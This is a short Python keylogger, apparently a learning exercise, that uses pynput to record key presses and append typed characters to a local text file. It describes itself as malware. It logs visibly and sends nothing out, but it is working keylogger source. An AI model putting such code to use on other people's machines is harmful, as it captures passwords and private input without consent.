#---------------------------------------------------------
# File: keylogger.py
# Author(s): Alyssa Chiego
# Purpose: malware that tracks and logs keboard input
# Audit: 07.24.24 AC // 07.25.24 AC
#---------------------------------------------------------


from pynput import keyboard

# prints typed key in terminal & creates .txt file
def keyPressed(key):
    # {0} refers to (key)
    print(str(key) + " pressed")
    # use 'a' bc we need to create new file if not exist already
    #   & we need file open for writing (appends)
    with open("keylogger.txt", 'a') as keyFile:
        try:
            keyChar = key.char # converts ascii to char
            keyFile.write(keyChar) # logs char 
        except:
             print("CHAR ERROR") 

# def KeyReleased(key): not needed bc not nec for tracking key

if __name__ == "__main__":
    # tells listener the on_press func is named kePressed
    listener = keyboard.Listener(on_press = keyPressed)
    listener.start() #starts the tracking/listener
    input() # prompts for input





#---------------------------------------------------------
#Sources:
#  https://pynput.readthedocs.io/en/latest/keyboard.html
#  https://pypi.org/project/pynput/
#  https://stackoverflow.com/questions/1466000/difference-between-modes-a-a-w-w-and-r-in-built-in-open-function
#  https://www.geeksforgeeks.org/how-to-use-pynput-to-make-a-keylogger/
#  https://www.youtube.com/watch?v=mDY3v2Xx-Q4&list=PLAnY4BB0CE5CGeXCCu5h8_OAI093px0ZK&index=16
#---------------------------------------------------------
